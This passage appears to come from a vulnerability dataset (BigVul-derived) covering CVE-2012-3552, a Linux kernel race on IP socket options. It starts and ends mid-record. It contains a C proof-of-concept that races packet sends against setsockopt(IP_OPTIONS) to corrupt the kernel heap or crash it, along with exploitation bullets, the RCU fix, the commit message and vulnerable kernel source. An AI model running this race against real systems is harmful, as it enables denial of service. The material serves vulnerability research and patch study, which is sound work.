break;\n}\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nsetsockopt() system call with IP_OPTIONS combined with concurrent packet transmission/reception\n\n[Mandatory] Exploit primitive(s) available:\nHeap write via slab corruption, denial of service via kernel crash\n\n[Mandatory] Exploitability summary (1 sentence):\nHigh exploitability on systems with active network traffic; requires local access to create sockets and trigger concurrent setsockopt calls during packet processing.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a UDP socket and bind it to an address\n- Spawn two threads: one continuously transmits packets, another repeatedly calls setsockopt(SOL_IP, IP_OPTIONS, ...)\n- The race condition occurs when setsockopt releases the old inet->opt while packet processing reads it\n- Heap allocator free-list corruption allows for controlled heap state\n- Trigger kernel crash by forcing heap metadata corruption through repeated mallocs/frees\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nvoid* tx_thread(void* arg) {\n    int sock = *(int*)arg;\n    struct sockaddr_in addr;\n    char buf[1024];\n    memset(&addr, 0, sizeof(addr));\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(5555);\n    inet_aton(\"127.0.0.1\", &addr.sin_addr);\n    \n    while(1) {\n        sendto(sock, buf, 1024, 0, \n               (struct sockaddr*)&addr, sizeof(addr));\n    }\n    return NULL;\n}\n\nvoid* opts_thread(void* arg) {\n    int sock = *(int*)arg;\n    struct ip_opts {\n        unsigned char opt_len;\n        unsigned char opt[39];\n    } opts;\n    \n    while(1) {\n        opts.opt_len = 20 + (rand() % 20);\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, \n                   &opts, opts.opt_len + 1);\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    pthread_t t1, t2;\n    pthread_create(&t1, NULL, tx_thread, &sock);\n    pthread_create(&t2, NULL, opts_thread, &sock);\n    pthread_join(t1, NULL);\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\ncase IP_OPTIONS:\n{\n    struct ip_options_rcu *old, *opt = NULL;\n    if (optlen > 40)\n        goto e_inval;\n    err = ip_options_get_from_user(sock_net(sk), &opt,\n                                   optval, optlen);\n    if (err)\n        break;\n    old = rcu_dereference_protected(inet->inet_opt,\n                                    sock_owned_by_user(sk));\n    if (inet->is_icsk) {\n        if (old)\n            icsk->icsk_ext_hdr_len -= old->opt.optlen;\n        if (opt)\n            icsk->icsk_ext_hdr_len += opt->opt.optlen;\n        icsk->icsk_sync_mss(sk, icsk->icsk_pmtu_cookie);\n    }\n    rcu_assign_pointer(inet->inet_opt, opt);\n    if (old)\n        call_rcu(&old->rcu, opt_kfree_rcu);\n    break;\n}\n```\n\n[Mandatory] Fix summary:\nThe patch adds RCU (Read-Copy-Update) protection to inet->opt by wrapping it in an ip_options_rcu structure. Instead of immediately freeing the old options, rcu_assign_pointer() ensures the new pointer is visible to all CPUs before the old one is freed via call_rcu(), eliminating the race condition between setsockopt and packet processing threads.\n\n[Optional] Patch reference:\nLinux commit f6d8bd051c391c1c0458a30b2a7abcd939329259; https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\n[Optional] Patch Analysis:\nThe fix transitions from unsafe atomic xchg+kfree to RCU-protected rcu_assign_pointer+call_rcu. This defers the actual deallocation until all RCU readers (packet processing code) have completed their critical sections, ensuring no thread has a reference to freed memory.\n\nPatchType: Synchronization fix via RCU read-side critical section protection\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other socket option cases in do_ip_setsockopt() for similar unprotected shared state modifications (IP_MULTICAST_IF, IP_ADD_MEMBERSHIP, etc.) that may lack RCU or locking\n- Audit ip_setup_cork() and other packet-preparation functions that read inet->opt to confirm RCU read-side critical sections are present\n- Check for similar patterns in IPv6 (ipv6_setsockopt) and other protocol families where socket options are concurrently accessed\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions may exist in other socket option handlers or protocol families where shared state is modified under lock_sock without RCU protection, risking heap corruption and DoS.\n\nEND",
        "tests": "NA",
        "solutions": "static int do_ip_setsockopt(struct sock *sk, int level,\n\t\t\t    int optname, char __user *optval, unsigned int optlen)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\tint val = 0, err;\n\n\tif (((1<<optname) & ((1<<IP_PKTINFO) | (1<<IP_RECVTTL) |\n\t\t\t     (1<<IP_RECVOPTS) | (1<<IP_RECVTOS) |\n\t\t\t     (1<<IP_RETOPTS) | (1<<IP_TOS) |\n\t\t\t     (1<<IP_TTL) | (1<<IP_HDRINCL) |\n\t\t\t     (1<<IP_MTU_DISCOVER) | (1<<IP_RECVERR) |\n\t\t\t     (1<<IP_ROUTER_ALERT) | (1<<IP_FREEBIND) |\n\t\t\t     (1<<IP_PASSSEC) | (1<<IP_TRANSPARENT) |\n\t\t\t     (1<<IP_MINTTL) | (1<<IP_NODEFRAG))) ||\n\t    optname == IP_MULTICAST_TTL ||\n\t    optname == IP_MULTICAST_ALL ||\n\t    optname == IP_MULTICAST_LOOP ||\n\t    optname == IP_RECVORIGDSTADDR) {\n\t\tif (optlen >= sizeof(int)) {\n\t\t\tif (get_user(val, (int __user *) optval))\n\t\t\t\treturn -EFAULT;\n\t\t} else if (optlen >= sizeof(char)) {\n\t\t\tunsigned char ucval;\n\n\t\t\tif (get_user(ucval, (unsigned char __user *) optval))\n\t\t\t\treturn -EFAULT;\n\t\t\tval = (int) ucval;\n\t\t}\n\t}\n\n\t/* If optlen==0, it is equivalent to val == 0 */\n\n\tif (ip_mroute_opt(optname))\n\t\treturn ip_mroute_setsockopt(sk, optname, optval, optlen);\n\n\terr = 0;\n\tlock_sock(sk);\n\n \tswitch (optname) {\n \tcase IP_OPTIONS:\n \t{\n\t\tstruct ip_options_rcu *old, *opt = NULL;\n\n \t\tif (optlen > 40)\n \t\t\tgoto e_inval;\n \t\terr = ip_options_get_from_user(sock_net(sk), &opt,\n \t\t\t\t\t       optval, optlen);\n \t\tif (err)\n \t\t\tbreak;\n\t\told = rcu_dereference_protected(inet->inet_opt,\n\t\t\t\t\t\tsock_owned_by_user(sk));\n \t\tif (inet->is_icsk) {\n \t\t\tstruct inet_connection_sock *icsk = inet_csk(sk);\n #if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)\n\t\t\tif (sk->sk_family == PF_INET ||\n\t\t\t    (!((1 << sk->sk_state) &\n \t\t\t       (TCPF_LISTEN | TCPF_CLOSE)) &&\n \t\t\t     inet->inet_daddr != LOOPBACK4_IPV6)) {\n #endif\n\t\t\t\tif (old)\n\t\t\t\t\ticsk->icsk_ext_hdr_len -= old->opt.optlen;\n \t\t\t\tif (opt)\n\t\t\t\t\ticsk->icsk_ext_hdr_len += opt->opt.optlen;\n \t\t\t\ticsk->icsk_sync_mss(sk, icsk->icsk_pmtu_cookie);\n #if defined(CONFIG_IPV6) || defined(CONFIG_IPV6_MODULE)\n \t\t\t}\n #endif\n \t\t}\n\t\trcu_assign_pointer(inet->inet_opt, opt);\n\t\tif (old)\n\t\t\tcall_rcu(&old->rcu, opt_kfree_rcu);\n \t\tbreak;\n \t}\n \tcase IP_PKTINFO:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |= IP_CMSG_PKTINFO;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_PKTINFO;\n\t\tbreak;\n\tcase IP_RECVTTL:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |=  IP_CMSG_TTL;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_TTL;\n\t\tbreak;\n\tcase IP_RECVTOS:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |=  IP_CMSG_TOS;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_TOS;\n\t\tbreak;\n\tcase IP_RECVOPTS:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |=  IP_CMSG_RECVOPTS;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_RECVOPTS;\n\t\tbreak;\n\tcase IP_RETOPTS:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |= IP_CMSG_RETOPTS;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_RETOPTS;\n\t\tbreak;\n\tcase IP_PASSSEC:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |= IP_CMSG_PASSSEC;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_PASSSEC;\n\t\tbreak;\n\tcase IP_RECVORIGDSTADDR:\n\t\tif (val)\n\t\t\tinet->cmsg_flags |= IP_CMSG_ORIGDSTADDR;\n\t\telse\n\t\t\tinet->cmsg_flags &= ~IP_CMSG_ORIGDSTADDR;\n\t\tbreak;\n\tcase IP_TOS:\t/* This sets both TOS and Precedence */\n\t\tif (sk->sk_type == SOCK_STREAM) {\n\t\t\tval &= ~3;\n\t\t\tval |= inet->tos & 3;\n\t\t}\n\t\tif (inet->tos != val) {\n\t\t\tinet->tos = val;\n\t\t\tsk->sk_priority = rt_tos2priority(val);\n\t\t\tsk_dst_reset(sk);\n\t\t}\n\t\tbreak;\n\tcase IP_TTL:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tif (val != -1 && (val < 0 || val > 255))\n\t\t\tgoto e_inval;\n\t\tinet->uc_ttl = val;\n\t\tbreak;\n\tcase IP_HDRINCL:\n\t\tif (sk->sk_type != SOCK_RAW) {\n\t\t\terr = -ENOPROTOOPT;\n\t\t\tbreak;\n\t\t}\n\t\tinet->hdrincl = val ? 1 : 0;\n\t\tbreak;\n\tcase IP_NODEFRAG:\n\t\tif (sk->sk_type != SOCK_RAW) {\n\t\t\terr = -ENOPROTOOPT;\n\t\t\tbreak;\n\t\t}\n\t\tinet->nodefrag = val ? 1 : 0;\n\t\tbreak;\n\tcase IP_MTU_DISCOVER:\n\t\tif (val < IP_PMTUDISC_DONT || val > IP_PMTUDISC_PROBE)\n\t\t\tgoto e_inval;\n\t\tinet->pmtudisc = val;\n\t\tbreak;\n\tcase IP_RECVERR:\n\t\tinet->recverr = !!val;\n\t\tif (!val)\n\t\t\tskb_queue_purge(&sk->sk_error_queue);\n\t\tbreak;\n\tcase IP_MULTICAST_TTL:\n\t\tif (sk->sk_type == SOCK_STREAM)\n\t\t\tgoto e_inval;\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tif (val == -1)\n\t\t\tval = 1;\n\t\tif (val < 0 || val > 255)\n\t\t\tgoto e_inval;\n\t\tinet->mc_ttl = val;\n\t\tbreak;\n\tcase IP_MULTICAST_LOOP:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tinet->mc_loop = !!val;\n\t\tbreak;\n\tcase IP_MULTICAST_IF:\n\t{\n\t\tstruct ip_mreqn mreq;\n\t\tstruct net_device *dev = NULL;\n\n\t\tif (sk->sk_type == SOCK_STREAM)\n\t\t\tgoto e_inval;\n\t\t/*\n\t\t *\tCheck the arguments are allowable\n\t\t */\n\n\t\tif (optlen < sizeof(struct in_addr))\n\t\t\tgoto e_inval;\n\n\t\terr = -EFAULT;\n\t\tif (optlen >= sizeof(struct ip_mreqn)) {\n\t\t\tif (copy_from_user(&mreq, optval, sizeof(mreq)))\n\t\t\t\tbreak;\n\t\t} else {\n\t\t\tmemset(&mreq, 0, sizeof(mreq));\n\t\t\tif (optlen >= sizeof(struct in_addr) &&\n\t\t\t    copy_from_user(&mreq.imr_address, optval,\n\t\t\t\t\t   sizeof(struct in_addr)))\n\t\t\t\tbreak;\n\t\t}\n\n\t\tif (!mreq.imr_ifindex) {\n\t\t\tif (mreq.imr_address.s_addr == htonl(INADDR_ANY)) {\n\t\t\t\tinet->mc_index = 0;\n\t\t\t\tinet->mc_addr  = 0;\n\t\t\t\terr = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tdev = ip_dev_find(sock_net(sk), mreq.imr_address.s_addr);\n\t\t\tif (dev)\n\t\t\t\tmreq.imr_ifindex = dev->ifindex;\n\t\t} else\n\t\t\tdev = dev_get_by_index(sock_net(sk), mreq.imr_ifindex);\n\n\n\t\terr = -EADDRNOTAVAIL;\n\t\tif (!dev)\n\t\t\tbreak;\n\t\tdev_put(dev);\n\n\t\terr = -EINVAL;\n\t\tif (sk->sk_bound_dev_if &&\n\t\t    mreq.imr_ifindex != sk->sk_bound_dev_if)\n\t\t\tbreak;\n\n\t\tinet->mc_index = mreq.imr_ifindex;\n\t\tinet->mc_addr  = mreq.imr_address.s_addr;\n\t\terr = 0;\n\t\tbreak;\n\t}\n\n\tcase IP_ADD_MEMBERSHIP:\n\tcase IP_DROP_MEMBERSHIP:\n\t{\n\t\tstruct ip_mreqn mreq;\n\n\t\terr = -EPROTO;\n\t\tif (inet_sk(sk)->is_icsk)\n\t\t\tbreak;\n\n\t\tif (optlen < sizeof(struct ip_mreq))\n\t\t\tgoto e_inval;\n\t\terr = -EFAULT;\n\t\tif (optlen >= sizeof(struct ip_mreqn)) {\n\t\t\tif (copy_from_user(&mreq, optval, sizeof(mreq)))\n\t\t\t\tbreak;\n\t\t} else {\n\t\t\tmemset(&mreq, 0, sizeof(mreq));\n\t\t\tif (copy_from_user(&mreq, optval, sizeof(struct ip_mreq)))\n\t\t\t\tbreak;\n\t\t}\n\n\t\tif (optname == IP_ADD_MEMBERSHIP)\n\t\t\terr = ip_mc_join_group(sk, &mreq);\n\t\telse\n\t\t\terr = ip_mc_leave_group(sk, &mreq);\n\t\tbreak;\n\t}\n\tcase IP_MSFILTER:\n\t{\n\t\tstruct ip_msfilter *msf;\n\n\t\tif (optlen < IP_MSFILTER_SIZE(0))\n\t\t\tgoto e_inval;\n\t\tif (optlen > sysctl_optmem_max) {\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\tmsf = kmalloc(optlen, GFP_KERNEL);\n\t\tif (!msf) {\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\terr = -EFAULT;\n\t\tif (copy_from_user(msf, optval, optlen)) {\n\t\t\tkfree(msf);\n\t\t\tbreak;\n\t\t}\n\t\t/* numsrc >= (1G-4) overflow in 32 bits */\n\t\tif (msf->imsf_numsrc >= 0x3ffffffcU ||\n\t\t    msf->imsf_numsrc > sysctl_igmp_max_msf) {\n\t\t\tkfree(msf);\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\tif (IP_MSFILTER_SIZE(msf->imsf_numsrc) > optlen) {\n\t\t\tkfree(msf);\n\t\t\terr = -EINVAL;\n\t\t\tbreak;\n\t\t}\n\t\terr = ip_mc_msfilter(sk, msf, 0);\n\t\tkfree(msf);\n\t\tbreak;\n\t}\n\tcase IP_BLOCK_SOURCE:\n\tcase IP_UNBLOCK_SOURCE:\n\tcase IP_ADD_SOURCE_MEMBERSHIP:\n\tcase IP_DROP_SOURCE_MEMBERSHIP:\n\t{\n\t\tstruct ip_mreq_source mreqs;\n\t\tint omode, add;\n\n\t\tif (optlen != sizeof(struct ip_mreq_source))\n\t\t\tgoto e_inval;\n\t\tif (copy_from_user(&mreqs, optval, sizeof(mreqs))) {\n\t\t\terr = -EFAULT;\n\t\t\tbreak;\n\t\t}\n\t\tif (optname == IP_BLOCK_SOURCE) {\n\t\t\tomode = MCAST_EXCLUDE;\n\t\t\tadd = 1;\n\t\t} else if (optname == IP_UNBLOCK_SOURCE) {\n\t\t\tomode = MCAST_EXCLUDE;\n\t\t\tadd = 0;\n\t\t} else if (optname == IP_ADD_SOURCE_MEMBERSHIP) {\n\t\t\tstruct ip_mreqn mreq;\n\n\t\t\tmreq.imr_multiaddr.s_addr = mreqs.imr_multiaddr;\n\t\t\tmreq.imr_address.s_addr = mreqs.imr_interface;\n\t\t\tmreq.imr_ifindex = 0;\n\t\t\terr = ip_mc_join_group(sk, &mreq);\n\t\t\tif (err && err != -EADDRINUSE)\n\t\t\t\tbreak;\n\t\t\tomode = MCAST_INCLUDE;\n\t\t\tadd = 1;\n\t\t} else /* IP_DROP_SOURCE_MEMBERSHIP */ {\n\t\t\tomode = MCAST_INCLUDE;\n\t\t\tadd = 0;\n\t\t}\n\t\terr = ip_mc_source(add, omode, sk, &mreqs, 0);\n\t\tbreak;\n\t}\n\tcase MCAST_JOIN_GROUP:\n\tcase MCAST_LEAVE_GROUP:\n\t{\n\t\tstruct group_req greq;\n\t\tstruct sockaddr_in *psin;\n\t\tstruct ip_mreqn mreq;\n\n\t\tif (optlen < sizeof(struct group_req))\n\t\t\tgoto e_inval;\n\t\terr = -EFAULT;\n\t\tif (copy_from_user(&greq, optval, sizeof(greq)))\n\t\t\tbreak;\n\t\tpsin = (struct sockaddr_in *)&greq.gr_group;\n\t\tif (psin->sin_family != AF_INET)\n\t\t\tgoto e_inval;\n\t\tmemset(&mreq, 0, sizeof(mreq));\n\t\tmreq.imr_multiaddr = psin->sin_addr;\n\t\tmreq.imr_ifindex = greq.gr_interface;\n\n\t\tif (optname == MCAST_JOIN_GROUP)\n\t\t\terr = ip_mc_join_group(sk, &mreq);\n\t\telse\n\t\t\terr = ip_mc_leave_group(sk, &mreq);\n\t\tbreak;\n\t}\n\tcase MCAST_JOIN_SOURCE_GROUP:\n\tcase MCAST_LEAVE_SOURCE_GROUP:\n\tcase MCAST_BLOCK_SOURCE:\n\tcase MCAST_UNBLOCK_SOURCE:\n\t{\n\t\tstruct group_source_req greqs;\n\t\tstruct ip_mreq_source mreqs;\n\t\tstruct sockaddr_in *psin;\n\t\tint omode, add;\n\n\t\tif (optlen != sizeof(struct group_source_req))\n\t\t\tgoto e_inval;\n\t\tif (copy_from_user(&greqs, optval, sizeof(greqs))) {\n\t\t\terr = -EFAULT;\n\t\t\tbreak;\n\t\t}\n\t\tif (greqs.gsr_group.ss_family != AF_INET ||\n\t\t    greqs.gsr_source.ss_family != AF_INET) {\n\t\t\terr = -EADDRNOTAVAIL;\n\t\t\tbreak;\n\t\t}\n\t\tpsin = (struct sockaddr_in *)&greqs.gsr_group;\n\t\tmreqs.imr_multiaddr = psin->sin_addr.s_addr;\n\t\tpsin = (struct sockaddr_in *)&greqs.gsr_source;\n\t\tmreqs.imr_sourceaddr = psin->sin_addr.s_addr;\n\t\tmreqs.imr_interface = 0; /* use index for mc_source */\n\n\t\tif (optname == MCAST_BLOCK_SOURCE) {\n\t\t\tomode = MCAST_EXCLUDE;\n\t\t\tadd = 1;\n\t\t} else if (optname == MCAST_UNBLOCK_SOURCE) {\n\t\t\tomode = MCAST_EXCLUDE;\n\t\t\tadd = 0;\n\t\t} else if (optname == MCAST_JOIN_SOURCE_GROUP) {\n\t\t\tstruct ip_mreqn mreq;\n\n\t\t\tpsin = (struct sockaddr_in *)&greqs.gsr_group;\n\t\t\tmreq.imr_multiaddr = psin->sin_addr;\n\t\t\tmreq.imr_address.s_addr = 0;\n\t\t\tmreq.imr_ifindex = greqs.gsr_interface;\n\t\t\terr = ip_mc_join_group(sk, &mreq);\n\t\t\tif (err && err != -EADDRINUSE)\n\t\t\t\tbreak;\n\t\t\tgreqs.gsr_interface = mreq.imr_ifindex;\n\t\t\tomode = MCAST_INCLUDE;\n\t\t\tadd = 1;\n\t\t} else /* MCAST_LEAVE_SOURCE_GROUP */ {\n\t\t\tomode = MCAST_INCLUDE;\n\t\t\tadd = 0;\n\t\t}\n\t\terr = ip_mc_source(add, omode, sk, &mreqs,\n\t\t\t\t   greqs.gsr_interface);\n\t\tbreak;\n\t}\n\tcase MCAST_MSFILTER:\n\t{\n\t\tstruct sockaddr_in *psin;\n\t\tstruct ip_msfilter *msf = NULL;\n\t\tstruct group_filter *gsf = NULL;\n\t\tint msize, i, ifindex;\n\n\t\tif (optlen < GROUP_FILTER_SIZE(0))\n\t\t\tgoto e_inval;\n\t\tif (optlen > sysctl_optmem_max) {\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\tgsf = kmalloc(optlen, GFP_KERNEL);\n\t\tif (!gsf) {\n\t\t\terr = -ENOBUFS;\n\t\t\tbreak;\n\t\t}\n\t\terr = -EFAULT;\n\t\tif (copy_from_user(gsf, optval, optlen))\n\t\t\tgoto mc_msf_out;\n\n\t\t/* numsrc >= (4G-140)/128 overflow in 32 bits */\n\t\tif (gsf->gf_numsrc >= 0x1ffffff ||\n\t\t    gsf->gf_numsrc > sysctl_igmp_max_msf) {\n\t\t\terr = -ENOBUFS;\n\t\t\tgoto mc_msf_out;\n\t\t}\n\t\tif (GROUP_FILTER_SIZE(gsf->gf_numsrc) > optlen) {\n\t\t\terr = -EINVAL;\n\t\t\tgoto mc_msf_out;\n\t\t}\n\t\tmsize = IP_MSFILTER_SIZE(gsf->gf_numsrc);\n\t\tmsf = kmalloc(msize, GFP_KERNEL);\n\t\tif (!msf) {\n\t\t\terr = -ENOBUFS;\n\t\t\tgoto mc_msf_out;\n\t\t}\n\t\tifindex = gsf->gf_interface;\n\t\tpsin = (struct sockaddr_in *)&gsf->gf_group;\n\t\tif (psin->sin_family != AF_INET) {\n\t\t\terr = -EADDRNOTAVAIL;\n\t\t\tgoto mc_msf_out;\n\t\t}\n\t\tmsf->imsf_multiaddr = psin->sin_addr.s_addr;\n\t\tmsf->imsf_interface = 0;\n\t\tmsf->imsf_fmode = gsf->gf_fmode;\n\t\tmsf->imsf_numsrc = gsf->gf_numsrc;\n\t\terr = -EADDRNOTAVAIL;\n\t\tfor (i = 0; i < gsf->gf_numsrc; ++i) {\n\t\t\tpsin = (struct sockaddr_in *)&gsf->gf_slist[i];\n\n\t\t\tif (psin->sin_family != AF_INET)\n\t\t\t\tgoto mc_msf_out;\n\t\t\tmsf->imsf_slist[i] = psin->sin_addr.s_addr;\n\t\t}\n\t\tkfree(gsf);\n\t\tgsf = NULL;\n\n\t\terr = ip_mc_msfilter(sk, msf, ifindex);\nmc_msf_out:\n\t\tkfree(msf);\n\t\tkfree(gsf);\n\t\tbreak;\n\t}\n\tcase IP_MULTICAST_ALL:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tif (val != 0 && val != 1)\n\t\t\tgoto e_inval;\n\t\tinet->mc_all = val;\n\t\tbreak;\n\tcase IP_ROUTER_ALERT:\n\t\terr = ip_ra_control(sk, val ? 1 : 0, NULL);\n\t\tbreak;\n\n\tcase IP_FREEBIND:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tinet->freebind = !!val;\n\t\tbreak;\n\n\tcase IP_IPSEC_POLICY:\n\tcase IP_XFRM_POLICY:\n\t\terr = -EPERM;\n\t\tif (!capable(CAP_NET_ADMIN))\n\t\t\tbreak;\n\t\terr = xfrm_user_policy(sk, optname, optval, optlen);\n\t\tbreak;\n\n\tcase IP_TRANSPARENT:\n\t\tif (!capable(CAP_NET_ADMIN)) {\n\t\t\terr = -EPERM;\n\t\t\tbreak;\n\t\t}\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tinet->transparent = !!val;\n\t\tbreak;\n\n\tcase IP_MINTTL:\n\t\tif (optlen < 1)\n\t\t\tgoto e_inval;\n\t\tif (val < 0 || val > 255)\n\t\t\tgoto e_inval;\n\t\tinet->min_ttl = val;\n\t\tbreak;\n\n\tdefault:\n\t\terr = -ENOPROTOOPT;\n\t\tbreak;\n\t}\n\trelease_sock(sk);\n\treturn err;\n\ne_inval:\n\trelease_sock(sk);\n\treturn -EINVAL;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/raw.c": "static int raw_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg,\n\t\t       size_t len)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\tstruct ipcm_cookie ipc;\n\tstruct rtable *rt = NULL;\n\tint free = 0;\n\t__be32 daddr;\n \t__be32 saddr;\n \tu8  tos;\n \tint err;\n \n \terr = -EMSGSIZE;\n \tif (len > 0xFFFF)\n\t\tgoto out;\n\n\t/*\n\t *\tCheck the flags.\n\t */\n\n\terr = -EOPNOTSUPP;\n\tif (msg->msg_flags & MSG_OOB)\t/* Mirror BSD error message */\n\t\tgoto out;               /* compatibility */\n\n\t/*\n\t *\tGet and verify the address.\n\t */\n\n\tif (msg->msg_namelen) {\n\t\tstruct sockaddr_in *usin = (struct sockaddr_in *)msg->msg_name;\n\t\terr = -EINVAL;\n\t\tif (msg->msg_namelen < sizeof(*usin))\n\t\t\tgoto out;\n\t\tif (usin->sin_family != AF_INET) {\n\t\t\tstatic int complained;\n\t\t\tif (!complained++)\n\t\t\t\tprintk(KERN_INFO \"%s forgot to set AF_INET in \"\n\t\t\t\t\t\t \"raw sendmsg. Fix it!\\n\",\n\t\t\t\t\t\t current->comm);\n\t\t\terr = -EAFNOSUPPORT;\n\t\t\tif (usin->sin_family)\n\t\t\t\tgoto out;\n\t\t}\n\t\tdaddr = usin->sin_addr.s_addr;\n\t\t/* ANK: I did not forget to get protocol from port field.\n\t\t * I just do not know, who uses this weirdness.\n\t\t * IP_HDRINCL is much more convenient.\n\t\t */\n\t} else {\n\t\terr = -EDESTADDRREQ;\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\tgoto out;\n\t\tdaddr = inet->inet_daddr;\n\t}\n\n\tipc.addr = inet->inet_saddr;\n\tipc.opt = NULL;\n\tipc.tx_flags = 0;\n\tipc.oif = sk->sk_bound_dev_if;\n\n\tif (msg->msg_controllen) {\n\t\terr = ip_cmsg_send(sock_net(sk), msg, &ipc);\n\t\tif (err)\n\t\t\tgoto out;\n\t\tif (ipc.opt)\n\t\t\tfree = 1;\n\t}\n\n \tsaddr = ipc.addr;\n \tipc.addr = daddr;\n \n\tif (!ipc.opt)\n\t\tipc.opt = inet->opt;\n \n \tif (ipc.opt) {\n \t\terr = -EINVAL;\n\t\t/* Linux does not mangle headers on raw sockets,\n\t\t * so that IP options + IP_HDRINCL is non-sense.\n \t\t */\n \t\tif (inet->hdrincl)\n \t\t\tgoto done;\n\t\tif (ipc.opt->srr) {\n \t\t\tif (!daddr)\n \t\t\t\tgoto done;\n\t\t\tdaddr = ipc.opt->faddr;\n \t\t}\n \t}\n \ttos = RT_CONN_FLAGS(sk);\n\tif (msg->msg_flags & MSG_DONTROUTE)\n\t\ttos |= RTO_ONLINK;\n\n\tif (ipv4_is_multicast(daddr)) {\n\t\tif (!ipc.oif)\n\t\t\tipc.oif = inet->mc_index;\n\t\tif (!saddr)\n\t\t\tsaddr = inet->mc_addr;\n\t}\n\n\t{\n\t\tstruct flowi4 fl4;\n\n\t\tflowi4_init_output(&fl4, ipc.oif, sk->sk_mark, tos,\n\t\t\t\t   RT_SCOPE_UNIVERSE,\n\t\t\t\t   inet->hdrincl ? IPPROTO_RAW : sk->sk_protocol,\n\t\t\t\t   FLOWI_FLAG_CAN_SLEEP, daddr, saddr, 0, 0);\n\n\t\tif (!inet->hdrincl) {\n\t\t\terr = raw_probe_proto_opt(&fl4, msg);\n\t\t\tif (err)\n\t\t\t\tgoto done;\n\t\t}\n\n\t\tsecurity_sk_classify_flow(sk, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_flow(sock_net(sk), &fl4, sk);\n\t\tif (IS_ERR(rt)) {\n\t\t\terr = PTR_ERR(rt);\n\t\t\trt = NULL;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\terr = -EACCES;\n\tif (rt->rt_flags & RTCF_BROADCAST && !sock_flag(sk, SOCK_BROADCAST))\n\t\tgoto done;\n\n\tif (msg->msg_flags & MSG_CONFIRM)\n\t\tgoto do_confirm;\nback_from_confirm:\n\n\tif (inet->hdrincl)\n\t\terr = raw_send_hdrinc(sk, msg->msg_iov, len,\n\t\t\t\t\t&rt, msg->msg_flags);\n\n\t else {\n\t\tif (!ipc.addr)\n\t\t\tipc.addr = rt->rt_dst;\n\t\tlock_sock(sk);\n\t\terr = ip_append_data(sk, ip_generic_getfrag, msg->msg_iov, len, 0,\n\t\t\t\t\t&ipc, &rt, msg->msg_flags);\n\t\tif (err)\n\t\t\tip_flush_pending_frames(sk);\n\t\telse if (!(msg->msg_flags & MSG_MORE)) {\n\t\t\terr = ip_push_pending_frames(sk);\n\t\t\tif (err == -ENOBUFS && !inet->recverr)\n\t\t\t\terr = 0;\n\t\t}\n\t\trelease_sock(sk);\n\t}\ndone:\n\tif 